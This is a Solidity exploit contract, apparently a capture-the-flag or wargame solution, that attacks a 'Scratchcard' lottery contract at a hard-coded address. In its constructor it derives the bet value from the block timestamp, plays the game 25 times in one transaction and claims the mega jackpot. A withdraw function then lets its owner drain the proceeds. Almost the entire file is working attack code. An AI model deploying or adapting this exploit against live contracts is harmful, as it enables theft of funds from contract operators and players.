pragma solidity 0.4.24;
//Address 0x726f3db5fe149682e92b33976a53cbe403612804
import './Scratchcard.sol';

contract Attack2{
    address owner;
    Scratchcard game = Scratchcard(0x726f3db5fe149682e92b33976a53cbe403612804);

    constructor() public payable {
        owner = tx.origin;
        uint val = (now%10**8)*10**10;
        for (uint i=0; i<25; i++) {
            game.play.value(val)();
        }
        game.collectMegaJackpot(2* val - 1);
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance); 
        }
    }

    function () public payable {}
}